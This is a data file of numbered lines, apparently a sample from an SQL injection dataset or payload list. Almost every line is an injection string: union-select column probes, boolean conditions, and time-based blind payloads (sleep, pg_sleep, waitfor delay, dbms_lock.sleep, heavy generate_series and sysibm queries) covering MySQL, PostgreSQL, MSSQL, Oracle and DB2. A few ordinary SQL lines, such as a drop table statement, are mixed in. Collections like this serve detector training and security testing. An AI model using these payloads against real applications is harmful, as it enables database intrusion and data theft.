0 1') union all select null,null,null,null,null,null,null-- 
5 -5524) as eoyk where 6928=6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928-- 
6 set ansi_nulls on 
12 1') and sleep(5)# 
16 -3433') where 8307=8307 union all select 8307,8307,8307,8307,8307,8307,8307,8307-- 
20 1') or sleep(5) and ('kgbm'='kgbm 
24 1")) union all select null,null,null,null,null,null,null,null,null# 
33 -4093')) union all select 5785,5785,5785# 
36 1' in boolean mode) union all select null,null,null# 
38 1%' and sleep(5)# 
42 1 where 5700=5700;select pg_sleep(5)-- 
43 -4222') union all select 9267,9267,9267,9267,9267,9267-- 
47 (extractvalue(1759,concat(0x5c,0x7171706a71,(select (elt(1759=1759,1))),0x717a767a71))) 
48 1') union all select null,null,null-- 
49 -9771' or 5113=5365 
52 -3219") order by 1-- 
66 1)) as xcsm where 9231=9231;select sleep(5)# 
86 1%'))) union all select null,null,null,null# 
87 1" or sleep(5) and "fbuo" like "fbuo 
103 -6214" union all select 3323,3323# 
106 1) or sleep(5) and (2211=2211 
107 1") and sleep(5) and ("fsuf" like "fsuf 
115 1%");select (case when (1898=4705) then 1898 else 1/(select 0) end)-- 
117 1")) and make_set(1167=5027,5027) and (("grfi"="grfi 
122 1' union all select null,null,null,null,null,null,null,null,null,null# 
127 1";select benchmark(5000000,md5(0x4c4d6142)) 
131 1%")) union all select null,null,null# 
138 1 and 8407=(select count(*) from generate_series(1,5000000)) 
146 1 waitfor delay '0:0:5'-- nnnp 
158 1%')) and 9198=9198-- 
164 -3104" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717-- 
165 1"));select count(*) from generate_series(1,5000000) and (("dros"="dros 
166 1";select pg_sleep(5)-- 
167 -9389') order by 1# 
168 1)));select pg_sleep(5) and (((9476=9476 
171 1"))) union all select null,null,null,null,null,null,null,null-- 
179 1');select count(*) from generate_series(1,5000000) 
182 1') union all select null,null,null,null,null,null,null,null# 
183 1 union all select null,null,null,null,null,null,null,null,null,null# 
191 1%")));begin dbms_lock.sleep(5); end-- 
193 1%"))) union all select null,null,null,null,null-- 
211 1") and (4085=4885)*4885 and ("sxte"="sxte 
219 1');select pg_sleep(5) 
222 1")) union all select null,null,null,null-- 
226 -6618"))) order by 1# 
227 1" where 6347=6347 union all select null,null,null,null,null,null,null,null# 
228 -8868") where 5681=5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681-- 
231 1" where 4808=4808 union all select null,null,null,null,null,null,null# 
244 -4100')) union all select 1163,1163,1163-- 
245 1%')) union all select null,null,null,null,null,null,null,null,null,null-- 
247 1%"))) union all select null,null,null,null,null,null# 
248 1")) or sleep(5) and (("mcyv"="mcyv 
250 -1351" where 6968=6968 or 5684=8582 
251 -2431') or 8571=8571-- 
252 1) where 7159=7159;select count(*) from generate_series(1,5000000)-- 
253 1%')) and make_set(6527=9529,9529) and (('%'=' 
256 1%'))) or sleep(5)# 
264 -9721' or elt(9511=9238,9238) 
266 1"))) and 7135=8805# 
274 -8143) union all select 3014-- 
278 1%")) and sleep(5) and (("%"=" 
281 -4947' order by 1# 
283 1)) as tnhy where 1874=1874 and 2858=7324# 
286 1' or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) 
291 1')) union all select null,null,null,null,null,null,null,null,null# 
293 1%')));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((('%'=' 
300 -5728) where 8663=8663 union all select 8663,8663,8663,8663,8663,8663,8663,8663,8663,8663# 
301 -4960') union all select 5300-- 
302 -6512'+(select 'zdjx' where 5454=5454 order by 1-- 
312 -1876%') union all select 6463-- 
314 1') union all select null,null,null,null,null,null,null,null,null,null# 
323 -5130')) union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218-- 
334 1)) union all select null,null,null,null,null,null,null-- 
340 1%";select sleep(5) and "%"=" 
344 -3794') union all select 2485,2485,2485,2485,2485-- 
355 1;select sleep(5) 
356 1%"));select count(*) from generate_series(1,5000000) and (("%"=" 
361 1%'));begin user_lock.sleep(5); end-- 
371 1') union all select null,null,null# 
373 1%") rlike sleep(5)# 
381 1";begin dbms_lock.sleep(5); end 
382 1')) and sleep(5) and (('jiio' like 'jiio 
384 1%')) union all select null,null,null,null,null,null,null,null,null-- 
385 1')) as xuab where 4369=4369 union all select null,null,null-- 
389 -6803") order by 1# 
392 -1203")) or 8571=8571-- 
411 -3633') where 3513=3513 union all select 3513,3513,3513,3513,3513,3513,3513,3513,3513,3513# 
413 1") union all select null,null,null# 
416 -9120')) or 8571=8571-- 
417 1")) order by 1# 
428 -5962)) as jbqv where 2583=2583 or 7496=8560-- 
430 -7683") where 9664=9664 union all select 9664,9664,9664,9664,9664,9664,9664# 
438 1"))) union all select null,null,null,null,null-- 
447 1');select sleep(5) 
448 1' union all select null,null,null,null,null,null,null,null,null-- 
449 1') union all select null,null# 
457 1' where 8969=8969 union all select null,null,null,null,null-- 
468 -9737"))) order by 1-- 
477 1") as xwnu where 6490=6490 union all select null,null,null,null,null,null-- 
480 1';(select * from (select(sleep(5)))srmq) 
483 1%'));select sleep(5)# 
492 1%' order by 1-- 
493 1 where 3175=3175 or 8421=(select count(*) from generate_series(1,5000000))-- 
496 -3731'))) or elt(7540=1412,1412) and ((('iwch'='iwch 
511 1" union all select null,null-- 
512 1" where 8016=8016;select count(*) from generate_series(1,5000000)-- 
520 1)) as eigk where 2557=2557;select count(*) from generate_series(1,5000000)-- 
525 -8888%') union all select 5312,5312,5312,5312,5312,5312,5312,5312-- 
527 -7404' where 1536=1536 order by 1# 
531 -7887') union all select 9049,9049,9049,9049,9049,9049,9049,9049,9049,9049# 
540 1;begin dbms_lock.sleep(5); end-- elvi 
546 1'))) and sleep(5) and ((('hwjy'='hwjy 
553 1 rlike (select (case when (8314=5463) then 1 else 0x28 end)) 
559 1 where 6304=6304;begin dbms_lock.sleep(5); end-- 
561 1' in boolean mode) union all select null,null# 
562 1");begin dbms_lock.sleep(5); end-- 
565 set @dateto = isnull (@dateto, getdate()) 
566 1'||(select 'xbwg' where 7518=7518 union all select null,null,null,null,null,null-- 
568 1) union all select null,null,null-- 
570 1 where 8102=8102 and 9198=9198-- 
575 1%' union all select null,null,null,null,null,null-- 
578 -3151%"))) union all select 6250,6250,6250,6250,6250,6250,6250,6250,6250,6250# 
584 1))) and sleep(5) and (((6618=6618 
589 -5052))) union all select 8351,8351,8351,8351# 
592 1%");select sleep(5)# 
594 -8364') union all select 4732,4732,4732,4732,4732,4732,4732,4732,4732# 
597 1'))) union all select null,null,null,null,null# 
599 -3361)) union all select 2827,2827,2827,2827# 
605 1") as jidc where 6093=6093 and 9198=9198-- 
610 1') as ohnu where 4097=4097 union all select null,null,null,null,null,null,null,null,null-- 
613 1") rlike sleep(5)# 
616 1;select count(*) from generate_series(1,5000000)-- 
617 -2899")) as uyoc where 8417=8417 union all select 8417,8417,8417,8417-- 
630 1")));select pg_sleep(5) and ((("nvuv" like "nvuv 
633 1%';select pg_sleep(5) and '%'=' 
641 1%"))) union all select null,null-- 
643 1');select sleep(5)# 
662 1") union all select null,null,null,null,null# 
666 1%")) union all select null,null,null,null,null-- 
673 -4885 union all select 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589# 
675 1") as jiyl where 4893=4893 union all select null,null,null,null,null# 
676 1")));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- 
686 -2197' union all select 8065,8065,8065,8065-- 
694 -5970' where 2769=2769 union all select 2769-- 
703 1%") union all select null,null,null,null# 
708 1%");select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- 
710 -6662")) union all select 6755-- 
715 1',(case when 2872=2872 then 1 else null end) 
716 1')) and 9198=9198-- 
720 1))) union all select null,null,null,null,null,null,null,null,null-- 
724 -9574%')) union all select 5645,5645,5645,5645,5645,5645,5645-- 
732 -5516'+(select 'bmlv' where 7188=7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188# 
738 -9808' in boolean mode) union all select 2528,2528,2528,2528,2528,2528,2528-- 
741 -1499) as gxfm where 9762=9762 or 5989=4782-- 
750 -9119") where 9237=9237 or 8571=8571-- 
752 1')));begin user_lock.sleep(5); end-- 
765 1') union all select null,null-- 
766 -2325'))) union all select 1442,1442,1442-- 
767 1'))) and 1743=6793 and ((('rgcv'='rgcv 
775 -2007%')) union all select 7298,7298,7298# 
781 -8588' union all select 2135,2135-- 
782 -3535%'))) or 5605=4660 and ((('%'=' 
801 1))) union all select null,null,null,null,null,null,null,null# 
803 1';select (case when (2352=8672) then 2352 else 2352*(select 2352 from information_schema.character_sets) end)# 
806 1'));select count(*) from generate_series(1,5000000) and (('hxcq'='hxcq 
814 1%') union all select null-- 
817 1;begin dbms_lock.sleep(5); end-- 
818 1%'))) union all select null,null-- 
827 -1844') union all select 9572,9572,9572,9572# 
830 1)) as uadn where 9588=9588 rlike sleep(5)# 
832 1')));select pg_sleep(5)-- 
835 1);select sleep(5) 
837 -5026' where 7324=7324 union all select 7324,7324-- 
845 1%'));select pg_sleep(5)-- 
885 1;select pg_sleep(5)-- 
887 1' and sleep(5) 
896 1"))) and sleep(5) and ((("bvgg"="bvgg 
904 -9891" union all select 7489# 
907 1%") union all select null,null,null-- 
912 1%") union all select null,null-- 
915 -5148")) or 5310=8229 
918 1'))) union all select null,null,null,null,null,null,null,null# 
927 1");select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- 
947 -7565')) union all select 7745,7745,7745,7745,7745,7745# 
950 1"));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (("sfnj" like "sfnj 
958 1%') union all select null,null,null,null,null,null,null,null,null,null-- 
960 1 or (select * from (select(sleep(5)))ydpu) 
961 -9697) union all select 3052,3052,3052,3052,3052,3052,3052,3052,3052-- 
964 1'||(select 'qgnz' where 6446=6446;select count(*) from generate_series(1,5000000)-- 
971 drop table [dbo].[dimdate] 
975 1"))) and 5429=9596 
980 1";select pg_sleep(5) 
981 -4679 where 9634=9634 union all select 9634,9634,9634,9634,9634,9634,9634-- 
984 1));begin user_lock.sleep(5); end and ((6874=6874 
985 -5131'))) union all select 4854,4854,4854,4854,4854,4854,4854# 
992 1%')) union all select null,null,null,null,null,null,null,null-- 
995 1'+(select qtyi where 7147=7147;select count(*) from generate_series(1,5000000)-- 
999 1' where 1692=1692;begin dbms_lock.sleep(5); end-- 
1014 1' in boolean mode) union all select null-- 
1017 1));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- 
1022 1;begin user_lock.sleep(5); end-- 
1037 1'))) union all select null,null,null,null,null-- 
1044 1) where 4548=4548 and 9198=9198-- 
1046 -4317")) as nxvn where 2566=2566 union all select 2566,2566,2566# 
1059 1")) as xbhp where 7527=7527;select count(*) from generate_series(1,5000000)-- 
1060 1" and make_set(8262=3471,3471) and "wayp"="wayp 
1069 1) union all select null,null,null,null# 
1071 1'+(select rwse where 9843=9843 union all select null,null,null,null,null,null,null-- 
1082 -1218' union all select 2663,2663,2663,2663-- 
